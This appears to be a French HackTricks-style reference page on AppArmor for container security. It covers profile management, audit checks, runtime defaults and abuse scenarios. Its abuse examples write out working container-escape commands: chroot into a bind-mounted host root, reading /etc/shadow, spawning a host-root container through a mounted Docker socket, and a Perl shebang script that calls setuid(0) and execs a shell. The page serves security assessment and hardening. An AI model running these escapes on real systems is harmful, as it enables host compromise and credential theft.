# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Vue d'ensemble

AppArmor est un système de **Contrôle d'accès obligatoire** qui applique des restrictions via des profils par programme. Contrairement aux contrôles DAC traditionnels, qui dépendent fortement de la propriété utilisateur et groupe, AppArmor permet au noyau d'appliquer une politique attachée au processus lui-même. Dans les environnements de conteneurs, cela importe parce qu'une charge de travail peut disposer de privilèges traditionnels suffisants pour tenter une action et se voir quand même refuser cette action parce que son profil AppArmor n'autorise pas le chemin, le montage, le comportement réseau ou l'utilisation de capabilities concernés.

Le point conceptuel le plus important est qu'AppArmor est **path-based**. Il raisonne sur l'accès au système de fichiers via des règles de chemin plutôt que via des labels comme le fait SELinux. Cela le rend accessible et puissant, mais signifie aussi que les bind mounts et les agencements de chemins alternatifs méritent une attention particulière. Si le même contenu hôte devient accessible via un chemin différent, l'effet de la politique peut ne pas être celui que l'opérateur avait initialement prévu.

## Rôle dans l'isolation des conteneurs

Les revues de sécurité de conteneurs s'arrêtent souvent aux capabilities et à seccomp, mais AppArmor reste pertinent après ces vérifications. Imaginez un conteneur qui dispose de plus de privilèges qu'il ne devrait, ou une charge de travail qui a besoin d'une capability supplémentaire pour des raisons opérationnelles. AppArmor peut néanmoins restreindre l'accès aux fichiers, le comportement des montages, le réseau et les modes d'exécution de façon à bloquer la voie d'abus évidente. C'est pourquoi désactiver AppArmor "just to get the application working" peut silencieusement transformer une configuration simplement risquée en une configuration activement exploitable.

## Laboratoire

Pour vérifier si AppArmor est actif sur l'hôte, utilisez :
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Pour voir sous quel contexte s'exécute le processus actuel du conteneur :
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
La différence est instructive. Dans le cas normal, le processus doit afficher un contexte AppArmor lié au profil choisi par le runtime. Dans le cas unconfined, cette couche de restriction supplémentaire disparaît.

Vous pouvez aussi inspecter ce que Docker pense avoir appliqué :
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Utilisation à l'exécution

Docker peut appliquer un profil AppArmor par défaut ou personnalisé lorsque l'hôte le supporte. Podman peut également s'intégrer à AppArmor sur les systèmes basés sur AppArmor, bien que sur les distributions privilégiant SELinux l'autre système MAC prenne souvent le dessus. Kubernetes peut exposer la politique AppArmor au niveau des charges de travail sur les nœuds qui supportent effectivement AppArmor. LXC et les environnements de conteneurs système des familles Ubuntu utilisent aussi AppArmor de façon extensive.

Le point pratique est qu'AppArmor n'est pas une "Docker feature". C'est une fonctionnalité du noyau de l'hôte que plusieurs runtimes peuvent choisir d'appliquer. Si l'hôte ne le supporte pas ou si le runtime est configuré pour s'exécuter unconfined, la protection supposée n'est en réalité pas présente.

Pour Kubernetes en particulier, l'API moderne est `securityContext.appArmorProfile`. Depuis Kubernetes `v1.30`, les anciennes annotations beta AppArmor sont dépréciées. Sur les hôtes supportés, `RuntimeDefault` est le profil par défaut, tandis que `Localhost` pointe vers un profil qui doit déjà être chargé sur le nœud. Cela a de l'importance lors d'une revue car un manifeste peut sembler AppArmor-aware tout en dépendant entièrement du support côté nœud et de profils préchargés.

Un détail opérationnel subtil mais utile est que définir explicitement `appArmorProfile.type: RuntimeDefault` est plus strict que d'omettre simplement le champ. Si le champ est défini explicitement et que le nœud ne supporte pas AppArmor, l'admission devrait échouer. Si le champ est omis, la charge de travail peut quand même s'exécuter sur un nœud sans AppArmor et ne pas bénéficier de cette couche de confinement supplémentaire. Du point de vue d'un attaquant, c'est une bonne raison de vérifier à la fois le manifeste et l'état réel du nœud.

Sur les hôtes AppArmor compatibles avec Docker, le profil par défaut le plus connu est `docker-default`. Ce profil est généré à partir du template AppArmor de Moby et est important car il explique pourquoi certaines PoC basées sur des capability échouent encore dans un conteneur par défaut. De manière générale, `docker-default` permet le réseau ordinaire, refuse les écritures dans une grande partie de `/proc`, refuse l'accès aux parties sensibles de `/sys`, bloque les opérations de mount et restreint ptrace de sorte que ce ne soit pas une primitive générale pour sonder l'hôte. Comprendre cette base permet de distinguer "le conteneur a `CAP_SYS_ADMIN`" de "le conteneur peut réellement utiliser cette capability contre les interfaces du noyau qui m'intéressent".

## Gestion des profils

Les profils AppArmor sont généralement stockés sous `/etc/apparmor.d/`. Une convention de nommage courante consiste à remplacer les slashs du chemin exécutable par des points. Par exemple, un profil pour `/usr/bin/man` est couramment stocké sous `/etc/apparmor.d/usr.bin.man`. Ce détail compte tant pour la défense que pour l'évaluation car une fois que vous connaissez le nom du profil actif, vous pouvez souvent localiser rapidement le fichier correspondant sur l'hôte.

Les commandes utiles côté hôte incluent :
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
La raison pour laquelle ces commandes sont importantes dans une référence sur la sécurité des conteneurs est qu'elles expliquent comment les profils sont réellement construits, chargés, basculés en complain mode et modifiés après des changements d'application. Si un opérateur a pour habitude de basculer les profils en complain mode lors du dépannage puis d'oublier de restaurer l'enforcement, le conteneur peut sembler protégé dans la documentation alors qu'il se comporte beaucoup plus permissivement en réalité.

### Création et mise à jour des profils

`aa-genprof` peut observer le comportement de l'application et aider à générer un profil de manière interactive :
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` peut générer un profil modèle qui peut ensuite être chargé avec `apparmor_parser`:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Lorsque le binaire change et que la politique doit être mise à jour, `aa-logprof` peut rejouer les refus trouvés dans les logs et aider l'opérateur à décider s'il faut les autoriser ou les refuser :
```bash
sudo aa-logprof
```
### Journaux

Les refus d'AppArmor sont souvent visibles via `auditd`, syslog, ou des outils tels que `aa-notify` :
```bash
sudo aa-notify -s 1 -v
```
Ceci est utile sur le plan opérationnel et offensif. Defenders l'utilisent pour affiner les profils. Attackers l'utilisent pour savoir quel chemin exact ou quelle opération est refusée et si AppArmor est le contrôle qui bloque un exploit chain.

### Identifier le fichier de profil exact

Lorsqu'un runtime affiche un nom de profil AppArmor spécifique pour un container, il est souvent utile d'associer ce nom au fichier de profil sur le disque :
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Cela est particulièrement utile lors d'une revue côté hôte car cela comble le fossé entre "le container indique qu'il s'exécute sous le profil `lowpriv`" et "les règles réelles se trouvent dans ce fichier spécifique qui peut être audité ou rechargé".

### Règles importantes à auditer

Lorsque vous pouvez lire un profil, ne vous arrêtez pas aux simples lignes `deny`. Plusieurs types de règles modifient de manière significative l'efficacité d'AppArmor contre une tentative d'évasion d'un container :

- `ux` / `Ux`: exécute le binaire cible sans confinement. Si un helper, shell, or interpreter accessible est autorisé sous `ux`, c'est généralement la première chose à tester.
- `px` / `Px` and `cx` / `Cx`: effectuent des transitions de profil lors d'un exec. Ce n'est pas automatiquement dangereux, mais cela vaut la peine d'être audité car une transition peut aboutir dans un profil beaucoup plus permissif que le profil courant.
- `change_profile`: permet à une tâche de basculer vers un autre profil chargé, immédiatement ou au prochain exec. Si le profil de destination est plus faible, cela peut devenir la voie d'évasion prévue depuis un domaine restrictif.
- `flags=(complain)`, `flags=(unconfined)`, or newer `flags=(prompt)`: ceux-ci doivent modifier le niveau de confiance que vous accordez au profil. `complain` journalise les refus au lieu de les appliquer, `unconfined` supprime la frontière, et `prompt` dépend d'un chemin de décision en userspace plutôt que d'un deny appliqué par le kernel.
- `userns` or `userns create,`: les politiques AppArmor récentes peuvent contrôler la création de user namespaces. Si un profil de container l'autorise explicitement, les user namespaces imbriqués restent possibles même lorsque la plateforme utilise AppArmor dans le cadre de sa stratégie de hardening.

Useful host-side grep:
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Ce type d'audit est souvent plus utile que de scruter des centaines de règles de fichiers ordinaires. Si un breakout dépend de l'exécution d'un helper, de l'entrée dans un nouveau namespace, ou de l'évasion vers un profile moins restrictif, la réponse est souvent cachée dans ces règles orientées transition plutôt que dans les lignes évidentes du style `deny /etc/shadow r`.

## Misconfigurations

La faute la plus évidente est `apparmor=unconfined`. Les administrateurs l'activent souvent en déboguant une application qui a échoué parce que le profile bloquait correctement quelque chose de dangereux ou inattendu. Si le flag reste en production, toute la couche MAC est effectivement supprimée.

Un autre problème subtil est de supposer que les bind mounts sont inoffensifs parce que les permissions des fichiers semblent normales. Comme AppArmor est path-based, exposer des host paths sous des emplacements de montage alternatifs peut interagir de façon défavorable avec les path rules. Une troisième erreur est d'oublier qu'un nom de profile dans un fichier de config signifie très peu si le noyau hôte n'applique pas réellement AppArmor.

## Abuse

Quand AppArmor est absent, des opérations auparavant contraintes peuvent soudainement fonctionner : lire des paths sensibles via des bind mounts, accéder à des parties de procfs ou sysfs qui auraient dû rester plus difficiles à utiliser, effectuer des actions liées au mount si capabilities/seccomp le permettent aussi, ou utiliser des paths qu'un profile refuserait normalement. AppArmor est souvent le mécanisme qui explique pourquoi une tentative de breakout basée sur des capabilities "devrait fonctionner" sur le papier mais échoue encore en pratique. Supprimez AppArmor, et la même tentative peut commencer à réussir.

Si vous soupçonnez qu'AppArmor est le principal frein à une chaîne d'abuse par path-traversal, bind-mount, ou mount-based, la première étape consiste généralement à comparer ce qui devient accessible avec et sans profile. Par exemple, si un host path est monté à l'intérieur du container, commencez par vérifier si vous pouvez le traverser et le lire :
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Si le conteneur dispose également d'une capacité dangereuse telle que `CAP_SYS_ADMIN`, l'un des tests les plus pratiques consiste à vérifier si AppArmor est le contrôle qui bloque les opérations de montage ou l'accès aux systèmes de fichiers sensibles du noyau :
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
Dans des environnements où un chemin sur l'hôte est déjà accessible via un bind mount, la désactivation d'AppArmor peut aussi transformer un problème de divulgation d'informations en lecture seule en un accès direct aux fichiers de l'hôte :
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Le but de ces commandes n'est pas qu'AppArmor, à lui seul, crée le breakout. Il s'agit que, une fois AppArmor supprimé, de nombreux filesystem et mount-based abuse paths deviennent immédiatement testables.

### Exemple complet : AppArmor désactivé + Host Root Mounted

Si le container a déjà le host root bind-mounted à `/host`, supprimer AppArmor peut transformer un blocked filesystem abuse path en un complete host escape :
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Une fois que le shell s'exécute via le système de fichiers de l'hôte, la charge de travail a effectivement échappé à la frontière du conteneur :
```bash
id
hostname
cat /etc/shadow | head
```
### Exemple complet : AppArmor désactivé + Runtime Socket

Si la véritable barrière était AppArmor autour de l'état d'exécution, un socket monté peut suffire pour une évasion complète :
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Le chemin exact dépend du point de montage, mais le résultat final est le même : AppArmor n'empêche plus l'accès au runtime API, et le runtime API peut lancer un conteneur qui compromet l'hôte.

### Exemple complet : Path-Based Bind-Mount Bypass

Parce qu'AppArmor est basé sur les chemins, protéger `/proc/**` ne protège pas automatiquement le même contenu procfs de l'hôte lorsqu'il est accessible via un chemin différent :
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
L'impact dépend de ce qui est exactement monté et de savoir si le chemin alternatif contourne également d'autres contrôles, mais ce schéma est l'une des raisons les plus claires pour lesquelles AppArmor doit être évalué conjointement avec la disposition des points de montage plutôt qu'isolément.

### Exemple complet : Shebang Bypass

La politique AppArmor cible parfois un chemin d'interpréteur d'une manière qui ne prend pas pleinement en compte l'exécution de scripts via le traitement du shebang. Un exemple historique impliquait l'utilisation d'un script dont la première ligne pointe vers un interpréteur confiné :
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Ce type d'exemple est important car il rappelle que l'intention d'un profil et la sémantique d'exécution réelle peuvent diverger. Lors de l'examen d'AppArmor dans des environnements container, les chaînes d'interpréteurs et les chemins d'exécution alternatifs méritent une attention particulière.

## Vérifications

Le but de ces vérifications est de répondre rapidement à trois questions : AppArmor est-il activé sur l'hôte, le processus courant est-il confiné, et le runtime a-t-il réellement appliqué un profil à ce container ?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Ce qui est intéressant ici :

- Si `/proc/self/attr/current` affiche `unconfined`, le workload ne bénéficie pas du confinement AppArmor.
- Si `aa-status` indique AppArmor désactivé ou non chargé, tout nom de profil dans la config runtime est pour l'essentiel cosmétique.
- Si `docker inspect` affiche `unconfined` ou un profil personnalisé inattendu, c'est souvent la raison pour laquelle un chemin d'abus basé sur le système de fichiers ou les mounts fonctionne.
- Si `/sys/kernel/security/apparmor/profiles` ne contient pas le profil attendu, la configuration du runtime ou de l'orchestrateur n'est pas suffisante en elle‑même.
- Si un profil supposé harden contient `ux`, des règles larges `change_profile`, `userns`, ou `flags=(complain)`, la frontière pratique peut être bien plus faible que ce que suggère le nom du profil.

Si un conteneur a déjà des privilèges élevés pour des raisons opérationnelles, laisser AppArmor activé fait souvent la différence entre une exception contrôlée et une défaillance de sécurité beaucoup plus large.

## Paramètres par défaut du runtime

| Runtime / plateforme | État par défaut | Comportement par défaut | Affaiblissement manuel courant |
| --- | --- | --- | --- |
| Docker Engine | Activé par défaut sur les hôtes compatibles AppArmor | Utilise le profil AppArmor `docker-default` sauf surdéfinition | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Dépendant de l'hôte | AppArmor est pris en charge via `--security-opt`, mais le comportement par défaut exact dépend de l'hôte/runtime et est moins universel que le profil `docker-default` documenté de Docker | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Par défaut conditionnel | Si `appArmorProfile.type` n'est pas spécifié, la valeur par défaut est `RuntimeDefault`, mais elle n'est appliquée que lorsque AppArmor est activé sur le nœud | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` avec un profil faible, nœuds sans support AppArmor |
| containerd / CRI-O under Kubernetes | Suit le support du nœud/runtime | Les runtimes couramment supportés par Kubernetes prennent en charge AppArmor, mais l'application effective dépend toujours du support du nœud et des paramètres du workload | Idem ligne Kubernetes ; la configuration directe du runtime peut aussi contourner AppArmor entièrement |

Pour AppArmor, la variable la plus importante est souvent l'**hôte**, pas seulement le runtime. Un réglage de profil dans un manifeste ne crée pas de confinement sur un nœud où AppArmor n'est pas activé.

## Références

- [Kubernetes security context: AppArmor profile fields and node-support behavior](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns`, and profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
